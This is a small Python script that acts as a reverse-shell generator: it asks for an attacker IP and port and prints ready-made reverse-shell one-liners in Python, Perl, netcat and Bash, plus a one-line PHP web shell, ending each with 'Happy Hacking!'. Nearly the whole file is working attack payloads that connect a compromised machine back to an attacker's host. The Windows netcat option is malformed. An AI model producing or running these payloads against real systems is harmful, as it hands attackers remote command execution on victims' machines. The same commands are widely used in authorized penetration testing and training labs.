import ipaddress
import time

ip = ipaddress.ip_address(input('Attacker IP: '))
port = int(input('Attacker Port: '))
print('Loading payloads...')
time.sleep(0.5)
while True:
    shell = int(input('Which shell do you wanna use?\n1 - Python (Linux)\n2 - Python3 (Linux)\n3 - Perl (Linux)\n4 - nc (Linux)\n5 - PHP simple cmd \n6 - Bash \n7 - nc.exe (Windows)\n8 - Exit \nNumber here: '))
    if shell == 1:
        print('Generating your shell...')
        time.sleep(0.5)
        print('Here it go: \n')
        time.sleep(0.1)
        print(f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'')
        time.sleep(0.1)
        print('\nHappy Hacking!')
    elif shell == 2:
        print('Generating your shell...')
        time.sleep(0.5)
        print('Here it go: \n')
        time.sleep(0.1)
        print(f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'')
        time.sleep(0.1)
        print('\nHappy Hacking!')
    elif shell == 3:
        print('Generating your shell...')
        time.sleep(0.5)
        print('Here it go: \n')
        time.sleep(0.1)
        print(f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}}'")
        time.sleep(0.1)
        print('\nHappy Hacking!')
    elif shell == 4:
        print('Generating your shell...')
        time.sleep(0.5)
        print('Here it go: \n')
        time.sleep(0.1)
        print(f'nc {ip} {port} -e /bin/bash')
        time.sleep(0.1)
        print('\nHappy Hacking!')
    elif shell == 5:
        print('Generating your shell...')
        time.sleep(0.2)
        print('Here it go: \n')
        time.sleep(0.1)
        print(f'<?=`$_GET[cmd]`?>')
        time.sleep(0.1)
        print('\nHappy Hacking!')
    elif shell == 6:
        print('Generating your shell...')
        time.sleep(0.5)
        print('Here it go: \n')
        time.sleep(0.1)
        print(f'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1')
        time.sleep(0.1)
        print('\nHappy Hacking!')
    elif shell == 7:
        print('Generating your shell...')
        time.sleep(0.5)
        print('Here it go: \n')
        time.sleep(0.1)
        print(f'nc.exe {ip} {port} -e /bin/bash)')
        time.sleep(0.1)
        print('\nHappy Hacking!')
    elif shell >= 8:
        print('\nHope see you soon')
        break
    time.sleep(0.3)
    continu = int(input('\nWant to generate another shell?\n1 - Yes, please\n2 - No, tnx \nNumber here: '))
    if continu != 1:
        print('\nHope see you soon')
        break